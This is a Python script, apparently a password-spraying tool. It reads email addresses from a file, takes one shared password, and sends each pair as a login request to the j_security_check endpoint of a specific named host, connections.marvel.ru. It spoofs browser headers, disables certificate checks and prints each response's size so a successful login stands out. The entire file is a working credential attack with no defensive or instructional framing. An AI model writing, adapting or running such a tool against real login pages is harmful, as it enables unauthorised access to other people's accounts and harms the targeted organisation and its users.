import os 
import sys 
import requests
from termcolor import colored

url = "https://connections.marvel.ru/files/j_security_check"
headers = {
    "Host": "connections.marvel.ru",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://connections.marvel.ru",
    "Referer": "https://connections.marvel.ru/files/login",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Te": "trailers",
}

def PostReq():
    with requests.Session() as session:
        Password = Passworddef()
        with open('Test.txt', 'r') as file:
            for mail in file:
                mail = mail.strip()
                data = {
                    "service.name": "files",
                    "secure": "true",
                    "fragment": "",
                    "j_username": mail,
                    "j_password": Password
                }
                SendReq(session, url, headers, data) 

def Passworddef():
    Passwd = input("Enter the default Password: ")
    print("This Is passwd " + Passwd)
    return Passwd

def SendReq(session, url, headers, data):
    print("Requested URL with JSON Data:", url)
    print("Headers:", headers)
    print("Data:", data)
    response = session.post(url, headers=headers, data=data, verify=False)
    response_size = len(response.content)
    print("The Request Sent:", response.text)
    print("Data Sent:", response)
    print("Response Size:", response_size)

def main():
    PostReq()

if __name__ == "__main__":
    main()
